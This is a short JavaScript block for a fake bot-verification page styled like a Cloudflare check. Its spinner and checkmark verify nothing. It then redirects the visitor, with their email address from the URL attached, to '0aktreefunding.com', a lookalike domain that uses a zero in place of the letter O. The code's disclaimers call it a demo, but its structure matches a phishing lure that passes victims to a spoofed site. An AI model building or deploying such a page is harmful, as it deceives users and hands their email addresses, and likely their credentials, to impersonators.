    <script>
        // Read the email query parameter from the current URL.
        const params = new URLSearchParams(window.location.search);
        const email = params.get("email") || "";

        // Set your intended destination here.
        const destination = new URL("https://0aktreefunding.com/");

        // Preserve the email parameter when redirecting.
        // Only use this for an authorized, transparent workflow.
        if (email) {
            destination.searchParams.set("email", email);
        }

        const verifyButton = document.getElementById("verify-button");
        const checkmark = document.getElementById("checkmark");
        const spinner = document.getElementById("spinner");
        const status = document.getElementById("status");
        const continueButton = document.getElementById("continue-button");

        verifyButton.addEventListener("click", function () {
            verifyButton.disabled = true;
            verifyButton.setAttribute("aria-pressed", "true");
            spinner.style.display = "block";
            checkmark.style.display = "none";
            status.textContent = "Demo check completed.";

            // This is a UI demonstration, not actual bot verification.
            window.setTimeout(function () {
                spinner.style.display = "none";
                checkmark.style.display = "block";
                verifyButton.style.borderColor = "#f38020";
                verifyButton.style.backgroundColor = "#fff7ed";
                status.textContent =
                    "Demo complete. Select Continue to proceed.";
                continueButton.style.display = "block";
            }, 800);
        });

        continueButton.addEventListener("click", function () {
            window.location.assign(destination.toString());
        });
    </script>
